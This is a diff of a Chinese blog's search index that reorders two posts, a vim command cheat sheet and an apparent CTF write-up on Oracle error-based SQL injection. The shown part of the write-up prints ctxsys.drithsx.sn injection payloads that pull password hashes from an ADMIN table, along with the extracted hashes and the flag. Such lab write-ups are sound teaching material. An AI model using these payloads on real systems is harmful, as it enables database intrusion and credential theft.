@@ -1,20 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>vim终端编辑器</title>
-    <url>/2021/09/02/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
-    <content><![CDATA[<h2 id="介绍：vim是vi的扩展，被誉为终端编辑器神器"><a href="#介绍：vim是vi的扩展，被誉为终端编辑器神器" class="headerlink" title="介绍：vim是vi的扩展，被誉为终端编辑器神器"></a>介绍：vim是vi的扩展，被誉为终端编辑器神器</h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><code>yum install -y vim</code></p>
-<h4 id="工作模式：正常模式，插入模式，编辑模式"><a href="#工作模式：正常模式，插入模式，编辑模式" class="headerlink" title="工作模式：正常模式，插入模式，编辑模式"></a>工作模式：正常模式，插入模式，编辑模式</h4><h4 id="正常模式：使用vim打开文件时的默认模式"><a href="#正常模式：使用vim打开文件时的默认模式" class="headerlink" title="正常模式：使用vim打开文件时的默认模式"></a>正常模式：使用vim打开文件时的默认模式</h4><p>vim filename    打开文件，若文件不存在就新建文件<br>esc：切换到正常模式<br>shift + zz ：保存退出<br>vim filename  +n： 打开文件，定位到第n行<br>vim filename  +： 打开文件，定位到末尾<br>gg：        定位到首行<br>G：        定位到尾行<br>ngg：    定位到第n行<br>^：        定位到行首<br>$：        定位到行尾<br>yy：        复制光标所在行<br>p：        粘贴<br>nyy：    复制光标开始的n行<br>dd：        删除光标所在行<br>ndd：    删除光标开始的n行<br>u：        撤销操作<br>ctrl + r:    反撤销操作</p>
-<h4 id="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："><a href="#插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：" class="headerlink" title="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："></a>插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：</h4><p>i：在光标处输入<br>I：在行首插入<br>a：在光标下一个字符处插入<br>A：在行位插入<br>o：在光标下一行插入一行空行<br>O：在光标上一行插入一行空行<br>s：删除光标所在字符并插入<br>S：删除光标所在行并插入</p>
-<h4 id="编辑模式：是对整个文件进行的操作，如：保存、退出"><a href="#编辑模式：是对整个文件进行的操作，如：保存、退出" class="headerlink" title="编辑模式：是对整个文件进行的操作，如：保存、退出"></a>编辑模式：是对整个文件进行的操作，如：保存、退出</h4><p>：w        保存<br>：q        退出<br>：q！    强制退出<br>：wq        保存退出，等价于shift+zz<br>：x        保存退出，等价于wq<br>：set nu    显示行号<br>：set nonu    隐藏行号<br>：行号    定位到指定行号<br>/内容        查找指定内容，n下翻，N上翻<br>：%s/原内容/新内容        使用新内容替换原内容，全部替换<br>：m,ns/原内容/新内容    使用新内容替换原内容，替换m行到n行</p>
-<p>友情提示：若非正常关闭vim，则会生成临时文件（隐藏的），需要删除</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
     <title>oracle注入报错注入oracle注入报错注入</title>
-    <url>/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <url>/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h4 id="oracle注入报错注入原理："><a href="#oracle注入报错注入原理：" class="headerlink" title="oracle注入报错注入原理："></a>oracle注入报错注入原理：</h4><p>同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，oracle注入报错注入数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据<code>CTXSYS.DRITHSX.SN(user,())</code></p>
 <h4 id="oracle注入报错注入-基本的语法："><a href="#oracle注入报错注入-基本的语法：" class="headerlink" title="oracle注入报错注入 基本的语法："></a>oracle注入报错注入 基本的语法：</h4><p><code>select from all_tables</code> 查询出所有的表</p>
 <p><code>select from user_tables</code> 查询出当前用户的表</p>
@@ -49,6 +37,18 @@
 <p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/11.png" alt="11"><br>得到数据：<code>f583aea84b6ded258f529205eb6d56a7</code><br>继续查其他数据<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39;))</code></p>
 <p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/12.png" alt="12"><br>试过发现这个也不是flag，继续<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39; and UPASS &lt;&gt;  &#39;9e8e7f6953dd11ceccc6ce655e03e070&#39;))</code></p>
 <p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/13.png" alt="13"><br>得到flag：<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>输入通关</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>vim终端编辑器</title>
+    <url>/2021/09/02/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="介绍：vim是vi的扩展，被誉为终端编辑器神器"><a href="#介绍：vim是vi的扩展，被誉为终端编辑器神器" class="headerlink" title="介绍：vim是vi的扩展，被誉为终端编辑器神器"></a>介绍：vim是vi的扩展，被誉为终端编辑器神器</h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><code>yum install -y vim</code></p>
+<h4 id="工作模式：正常模式，插入模式，编辑模式"><a href="#工作模式：正常模式，插入模式，编辑模式" class="headerlink" title="工作模式：正常模式，插入模式，编辑模式"></a>工作模式：正常模式，插入模式，编辑模式</h4><h4 id="正常模式：使用vim打开文件时的默认模式"><a href="#正常模式：使用vim打开文件时的默认模式" class="headerlink" title="正常模式：使用vim打开文件时的默认模式"></a>正常模式：使用vim打开文件时的默认模式</h4><p>vim filename    打开文件，若文件不存在就新建文件<br>esc：切换到正常模式<br>shift + zz ：保存退出<br>vim filename  +n： 打开文件，定位到第n行<br>vim filename  +： 打开文件，定位到末尾<br>gg：        定位到首行<br>G：        定位到尾行<br>ngg：    定位到第n行<br>^：        定位到行首<br>$：        定位到行尾<br>yy：        复制光标所在行<br>p：        粘贴<br>nyy：    复制光标开始的n行<br>dd：        删除光标所在行<br>ndd：    删除光标开始的n行<br>u：        撤销操作<br>ctrl + r:    反撤销操作</p>
+<h4 id="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："><a href="#插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：" class="headerlink" title="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："></a>插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：</h4><p>i：在光标处输入<br>I：在行首插入<br>a：在光标下一个字符处插入<br>A：在行位插入<br>o：在光标下一行插入一行空行<br>O：在光标上一行插入一行空行<br>s：删除光标所在字符并插入<br>S：删除光标所在行并插入</p>
+<h4 id="编辑模式：是对整个文件进行的操作，如：保存、退出"><a href="#编辑模式：是对整个文件进行的操作，如：保存、退出" class="headerlink" title="编辑模式：是对整个文件进行的操作，如：保存、退出"></a>编辑模式：是对整个文件进行的操作，如：保存、退出</h4><p>：w        保存<br>：q        退出<br>：q！    强制退出<br>：wq        保存退出，等价于shift+zz<br>：x        保存退出，等价于wq<br>：set nu    显示行号<br>：set nonu    隐藏行号<br>：行号    定位到指定行号<br>/内容        查找指定内容，n下翻，N上翻<br>：%s/原内容/新内容        使用新内容替换原内容，全部替换<br>：m,ns/原内容/新内容    使用新内容替换原内容，替换m行到n行</p>
+<p>友情提示：若非正常关闭vim，则会生成临时文件（隐藏的），需要删除</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
